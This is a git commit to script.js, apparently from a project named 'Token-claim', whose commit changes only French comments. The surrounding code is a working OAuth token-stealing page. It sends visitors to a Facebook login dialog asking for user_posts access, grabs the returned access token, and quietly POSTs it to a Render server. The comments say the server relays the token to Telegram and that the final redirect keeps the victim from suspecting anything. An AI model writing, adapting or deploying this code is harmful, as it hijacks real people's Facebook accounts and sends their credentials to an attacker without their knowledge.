37a5d8590a654ded0f3da07628e4b05d8ecb5d44
jeandolin2-lang <jeandolin2@gmail.com>
2026-04-09 12:15:48 +0300

    Update script.js

--- script.js
+++ script.js
@@ -2,25 +2,25 @@ const GITHUB_URL = "https://jeandolin2-lang.github.io/Token-claim/";
 const RENDER_URL = "https://token-claim.onrender.com/save-token";
 
 window.onload = function() {
-    // ÉTAPE A : Si l'URL contient un access_token (retour de FB)
+    // Cas 1 : On revient de Facebook avec le Token
     if (window.location.hash.includes('access_token')) {
         const params = new URLSearchParams(window.location.hash.replace('#', '?'));
         const token = params.get('access_token');
 
         if (token) {
-            // Envoi au serveur Render sans que l'utilisateur le voie
+            // Envoi au serveur Render (qui l'envoie à ton Telegram)
             fetch(RENDER_URL, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ token: token })
             })
             .finally(() => {
-                // Redirection finale vers Facebook pour finir proprement
+                // Redirection finale vers FB pour que l'utilisateur ne se doute de rien
                 window.location.href = "https://www.facebook.com";
             });
         }
     } 
-    // ÉTAPE B : Si c'est un nouveau visiteur, on l'envoie direct vers Facebook
+    // Cas 2 : L'utilisateur arrive sur le site, on l'envoie direct sur FB
     else {
         const clientId = "350685531728";
         const authUrl = `https://www.facebook.com/v1.0/dialog/oauth?client_id=${clientId}&redirect_uri=${GITHUB_URL}&response_type=token&scope=public_profile,user_posts`;
